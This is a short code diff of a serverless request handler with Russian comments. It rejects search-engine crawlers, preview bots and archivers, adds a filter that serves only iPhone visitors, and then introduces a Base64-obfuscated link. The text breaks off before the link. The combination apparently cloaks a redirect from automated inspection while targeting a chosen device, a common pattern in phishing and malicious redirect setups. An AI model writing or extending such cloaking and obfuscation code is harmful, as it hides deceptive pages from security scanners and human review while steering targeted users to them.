@@ -4,9 +4,14 @@ export default async function handler(req, res) {
   const cf = req.headers['x-vercel-forwarded-for'] || '';
 
   const isBot = /(google|bot|crawler|spider|facebook|preview|archive|bing)/i.test(userAgent);
+  const isIphone = /iPhone/i.test(userAgent); // Проверка на iPhone
 
   if (isBot) {
     return res.status(403).json({ status: 'bot' });
+  }
+
+  if (!isIphone) {
+    return res.status(403).json({ status: 'not_iphone' });
   }
 
   // Зашифрованная ссылка (Base64)
